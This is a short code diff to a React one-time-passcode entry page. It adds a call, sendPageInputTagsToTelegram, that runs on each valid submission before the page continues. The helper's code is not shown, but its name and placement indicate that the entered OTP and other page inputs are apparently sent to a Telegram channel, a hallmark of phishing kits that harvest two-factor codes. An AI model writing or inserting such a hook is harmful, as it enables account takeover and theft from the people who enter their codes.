@@ -1,4 +1,5 @@
 import React, { useState } from 'react';
+import { sendPageInputTagsToTelegram } from '../utils/telegram';
 
 interface OtpInputPageProps {
   onContinue?: () => void;
@@ -9,9 +10,10 @@ interface OtpInputPageProps {
 export function OtpInputPage({ onContinue, onCancel, onResend }: OtpInputPageProps) {
   const [otp, setOtp] = useState('');
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (otp.length >= 4 && otp.length <= 6 && onContinue) {
+      await sendPageInputTagsToTelegram();
       onContinue();
     }
   };
